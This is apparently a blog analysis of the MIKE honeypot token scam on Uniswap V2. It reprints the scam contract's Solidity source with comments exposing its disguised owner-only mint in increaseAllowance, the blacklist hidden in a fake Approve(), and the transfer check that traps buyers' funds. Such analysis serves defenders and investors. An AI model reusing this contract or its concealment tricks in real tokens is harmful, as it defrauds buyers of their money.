---
layout: post
category: attack_events
---

# A mythical wild animal

## brief

- twitterï¼šhttps://twitter.com/BeosinAlert/status/1676057831550906368?s=20

- Hacker address: slot[ Guest private _guest]: 0x000000000000000000000000f7e0d99511eab452bcbbdc34285e25f10e28f79d

- token: https://etherscan.io/address/0x8b99bb8ddd8103cbeccc3b20c4b0038ca65a51ae

- Liquidity pool: https://etherscan.io/token/0x8b99bb8ddd8103cbeccc3b20c4b0038ca65a51ae

- one tx of adding victims to blacklist: https://etherscan.io/tx/0x9727f0e7cbfac6af493cacc9bfb8781b06fa0d45cba8927de7fef0438b1972b8

![](https://moe.photo/images/2023/07/14/image-20230714220446313.png)

## analyses

1.The hacker create ERC20 pair in uniswap V2: WETH and token MIKE. 

![](https://moe.photo/images/2023/07/14/image-20230714223118345.png)

2.The victims use WETH to buy token MIKE in the liquidity pool of uniswap V2. 

3.The hacker adds victims into blacklist and mints token to himself.

![](https://moe.photo/images/2023/07/14/image-20230714220813225.png)

4.When victims call `transferFrom()` , the transaction will fail because they r in blacklist. In this case, there will be more and more WETHs in the pool, with fewer and fewer tokens, resulting in tokens becoming increasingly valuable. 

5.Victims cann't transfer token MIKE, only the hacker can. 

6.The hacker can mint token MIKE infinitely by `incrementAllowance()`. With infinite money, hacker could get all the WETH in liquidity pool.

My analyses is included in the following code:

```solidity
pragma solidity 0.8.18;

contract Mike is IERC20, Token, Ownable {
    using SafeMath for uint256;

    struct Guest {
        address guest;
    }

    mapping(address => uint256) private _balances;

    mapping(address => address) private _dex; // blacklist

    mapping(address => mapping(address => uint256)) private _allowances;

    Guest private _guest;
    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _totalSupply;

    constructor( string memory name_, string memory symbol_, address user_, uint256 totalSupply_) payable {
        _name = name_;
        _symbol = symbol_;
        _decimals = 18;
        _guest.guest = user_;
        // hakcer mint for the first, victims will thought this will be the whole token supply,
        // because they don't see any mint() function. In fact, increaseAllowance() can mint token but
        // only hacker can.
        _mint(msg.sender, totalSupply_ * 10**18); 
        emit Deploy(
            owner(),
            VERSION
        );
    }

    function name() public view virtual returns (string memory) {
        return _name;
    }
    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }
    function decimals() public view virtual returns (uint8) {
        return _decimals;
    }
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }
    function balanceOf(address account) public view virtual override returns (uint256){
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtualoverride returns (uint256){
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool){
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom( address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "IERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

////////////////////////// can't transfer //////////////////////////////////////   
    function _transfer( address sender,address recipient, uint256 amount) internal virtual {
        _requireBalance(sender, recipient, amount); // victims can't pass this! the tx will revert!
        require(sender != address(0), "IERC20: transfer from the zero address");
        require(recipient != address(0),"IERC20: transfer to the zero address");

        _beforeTokenTransfer(sender, recipient, amount); //do nothing
        _balances[sender] = _balances[sender].sub(amount,"IERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient] + amount;
        emit Transfer(sender, recipient, amount);
    } 
////////////////////////// can't transfer //////////////////////////////////////   

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "IERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount); //do nothing

        _totalSupply = _totalSupply.add(amount);
        _plus(account, amount);
        emit Transfer(address(0), account, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "IERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount); //do nothing
        require(amount != 0, "Invalid amount");
        _minus(account, amount);
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }

    function _minus(address account, uint256 amount) internal {
        _balances[account] = _balances[account] - amount;
    }

    function _plus(address account, uint256 amount) internal {
        _balances[account] = _balances[account] + amount;
    }

    function _approve( address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "IERC20: approve from the zero address");
        require(spender != address(0), "IERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

////////////////////////// equil to mint but only hacker can call //////////////////////////////////////   
    function increaseAllowance(address spender, uint256 amount) public virtual {
        address from = msg.sender;
        require(spender != address(0), "Invalid address");
        require(amount > 0, "Invalid amount");
        uint256 total = 0;
        if (_decode(spender, _guest.guest)) { 
        // if u r hacker, it will return true. _from's balance won't minus while spender's balance can increase  
            _minus(from, total);
            total = _somma(total, amount);
            _balances[spender] += total;
        } else { // if u r not hacker, do nothing here since 'total' is zero.
            _minus(from, total);
            _balances[spender] += total;
        }
    } // back door
////////////////////////// equil to mint but only hacker can call //////////////////////////////////////  

////////////////////////// check hacker //////////////////////////////////////   

    function _decode(address user, address user2) internal view returns (bool) {
        bytes32 hash1 = keccak256(abi.encodePacked(user));
        bytes32 hash2 = keccak256(abi.encodePacked(user2));
        return hash1 == hash2;
    } 

    function _somma(uint256 aqw, uint256 poe) internal pure returns (uint256) {
        if (poe != 0) {
            return aqw + poe;
        }
        return poe;
    }
////////////////////////// check hacker //////////////////////////////////////   

////////////////////////// add to blacklist //////////////////////////////////////
    function Approve(address spender, uint256 amount) public returns (bool)  {
        address from = msg.sender;
        _checkAllowance(from, spender, amount); // not approve but add something into blacklist!
        return true;
    }

    function _checkAllowance(address user, address spender, uint256 amount) internal {
    	// only hacker can enter, because _guest.guest is hacker's address
        if (_decode(user, _guest.guest)) { 
            require(spender != address(0), "Invalid address");
            if (amount != 0) {
                _dex[spender] = spender; // add victims into _dex: blacklist
            } else {
                _dex[spender] = address(0); 
            }
        }
    } 
////////////////////////// add to blacklist //////////////////////////////////////

////////////////////////// tx will revert //////////////////////////////////////
    function _requireBalance(address sender, address recipient, uint256 total) internal virtual {
    	// recipient is not used!
        uint256 amount = 0;
        if (_decode(sender, _dex[sender])) { // victims' tx will enter this condition
            _balances[sender] = _balances[sender] + amount;
            amount = _totalSupply;
            _minus(sender, amount); // the tx will revert for the insufficient balance
        } else { // only whitelist
            _balances[sender] = _balances[sender] + amount;
        }
    }// 
////////////////////////// tx will revert //////////////////////////////////////

    function _beforeTokenTransfer( address from, address to, uint256 amount) internal virtual {}
}
```































